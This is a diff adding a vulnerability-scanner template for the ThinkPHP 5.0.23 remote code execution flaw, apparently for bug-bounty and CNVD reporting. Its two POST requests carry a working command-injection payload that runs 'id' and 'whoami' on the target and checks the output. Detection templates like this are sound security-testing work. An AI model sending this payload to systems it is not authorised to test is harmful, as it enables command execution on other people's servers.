@@ -1,0 +1,50 @@
+id: thinkphp-5023-rce
+
+info:
+  name: ThinkPHP 5.0.23 - Remote Code Execution
+  author: bai-codeagent
+  severity: critical
+  description: |
+    ThinkPHP 5.0.23 存在远程代码执行漏洞，攻击者通过构造特殊请求参数可执行任意系统命令。
+    这是国内最经典的框架漏洞之一，大量网站使用此版本且未升级。
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+  tags: thinkphp,rce,cn-cms
+  metadata:
+    cnvd-applicable: true
+    src-applicable: true
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*groups="
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=captcha"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root"
+          - "www-data"
+          - "apache"
+          - "nginx"
+        condition: or
+      - type: status
+        status:
+          - 200
